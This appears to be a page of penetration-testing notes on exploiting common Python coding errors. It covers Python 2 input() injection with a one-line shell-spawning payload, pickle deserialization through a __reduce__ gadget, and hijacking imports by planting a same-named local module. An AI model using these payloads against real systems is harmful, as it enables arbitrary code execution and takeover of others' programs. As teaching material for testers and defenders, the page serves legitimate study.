# Python

Python is a language powering an extraordinary number of applications, but here we're just going to focus on very common coding errors you're likely to find. These can be useful in cases of both web applications as well as local and exploiting any of these is incredibly context specific.

## python2 input

In python 2, the input function worked in an interesting manner. It queried for user input, executed the input given to it directly, allowing us to, for example, have an integer returned directly from the result of the function. However, this also allowed any arbitrary code to be injected. In cases where you have a python 2 style input mechanism, simply write the following:

```python
__import__('os').system('/bin/bash')
```

In python 3 this was removed, and raw\_input from python 2 replaced it.

## Pickle Deserialization

During pickle deserialization, it is possible to create a situation where arbitrary code is executed. This is because the reduce method defines how the object itself is de-serialized, and so will be executed when pickle.loads is called:

```python
import subprocess
class BadPickle(object):
    def __reduce__(self):
        return (subprocess.check_output, (chars,))
print cPickle.dumps(BadPickle())
```

**Further Reading**  
[https://blog.nelhage.com/2011/03/exploiting-pickle/    
](https://blog.nelhage.com/2011/03/exploiting-pickle/%20)[https://sensepost.com/blog/2010/playing-with-python-pickle-%231/    
](https://sensepost.com/blog/2010/playing-with-python-pickle-%231/%20)[https://dan.lousqui.fr/explaining-and-exploiting-deserialization-vulnerability-with-python-en.html](https://dan.lousqui.fr/explaining-and-exploiting-deserialization-vulnerability-with-python-en.html)

## Module Overwrite

Consider the following program:

```python
import base64
print base64.b64decode('VW5pY29ybidzIGFyZSBraWNrIGFzcyE=')
```

Running it will output a base64 decoded string:

```python
root@kali:~/pyexample# python example.py
Unicorn's are kick ass!
```

Let's create a file called base64.py in the same folder and include within it the following:

```python
def b64decode(oldinput):
    return 'Welcome to my Evil Function!'
```

Now we get a very different output:

```bash
root@kali:~/pyexample# ls
base64.py  base64.pyc  example.py
root@kali:~/pyexample# python example.py
Welcome to my Evil Function!
```

In module importing, the interpreter will first check the local directory before checking the installed modules. Consequently, it is more than possible to take over a python scripts execution, even if we don't have write-access to it.

A good reference for how these things work is [this Stackoverflow post](https://stackoverflow.com/questions/31849378/whats-the-order-python-used-to-import-module).

